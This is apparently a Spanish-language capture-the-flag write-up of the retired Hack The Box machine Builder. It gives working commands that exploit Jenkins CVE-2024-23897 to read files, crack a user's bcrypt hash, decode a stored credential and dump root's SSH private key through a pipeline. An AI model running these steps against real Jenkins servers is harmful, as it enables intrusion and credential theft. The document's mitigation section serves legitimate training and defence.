---
machine: Builder
os: Linux
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [linux, web, jenkins, cve, file-read, ssh]
---

# Builder — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

Jenkins 2.441 es vulnerable a CVE-2024-23897: la CLI expande `@<ruta>` y permite leer archivos. Se extrae el hash bcrypt de `jennifer`, se crackea y se accede al panel, donde una credencial SSH de root queda oculta pero recuperable. Con la clave se entra como root.

## Reconocimiento

```bash
nmap -Pn -sCV -p22,8080 <IP>
```

- `22/tcp` OpenSSH en Ubuntu 22.04.
- `8080/tcp` Jetty con Jenkins; la cabecera `X-Jenkins` confirma la versión `2.441`.
- `robots.txt` deshabilita todo el sitio y el panel muestra un único usuario, `jennifer`.

## Enumeración

- Se descarga `jnlpJars/jenkins-cli.jar` y se listan los comandos disponibles.
- CVE-2024-23897 permite sustituir un argumento `@archivo` por el contenido del archivo.
- El hash de `jennifer` está en `/var/jenkins_home/users/jennifer_*/config.xml`.

## Foothold

Se usa la CLI para leer el `config.xml` y se extrae el hash bcrypt. `hashcat -m 3200` lo crackea; con la contraseña se inicia sesión en Jenkins.

```bash
java -jar jenkins-cli.jar -s http://<IP>:8080 help 0xdf
java -jar jenkins-cli.jar -s http://<IP>:8080 connect-node @/var/jenkins_home/users/jennifer_*/config.xml
hashcat -m 3200 hash.txt rockyou.txt
```

## Movimiento lateral

No hay otro host. El pivote es de la cuenta web de Jenkins a la credencial SSH de root almacenada en el propio servidor.

## Escalada de privilegios

La credencial `root` está oculta en el formulario de edición, pero su valor cifrado se envía al navegador. Se descifra desde la consola de scripts o se recupera ejecutando una pipeline con el plugin SSH Agent.

```bash
# En Manage Jenkins -> Script Console
println(new String(javax.xml.bind.DatatypeConverter.parseBase64Binary('<BLOB>')))

# O en una pipeline:
node { sshagent(credentials: ['1']) { sh 'cat /root/.ssh/id_rsa' } }
```

Con la clave privada se accede por SSH como root.

## Evidencia

- `X-Jenkins: 2.441` y salida de la CLI con el hash.
- Acceso al panel como `jennifer`.
- Clave privada de root y prompt `root@builder`.

## Lecciones aprendidas

- La CLI de Jenkins es una superficie de lectura de archivos si no se actualiza.
- Un hash bcrypt débil en una cuenta de servicio permite entrar al panel.
- Las credenciales ocultas en formularios suelen viajar al cliente y son recuperables.

## Mitigación y detección

- Actualizar Jenkins a una versión corregida de CVE-2024-23897.
- Restringir la CLI y el puerto `8080` a redes administrativas.
- Rotar credenciales de despliegue y auditar su uso en pipelines.

## Referencias

- [0xdf — Builder](https://0xdf.gitlab.io/2024/02/12/htb-builder.html)
- [IppSec — Builder](https://www.youtube.com/watch?v=jYCOIf9Fcmo)
- [Hack The Box — Builder](https://app.hackthebox.com/machines/builder)
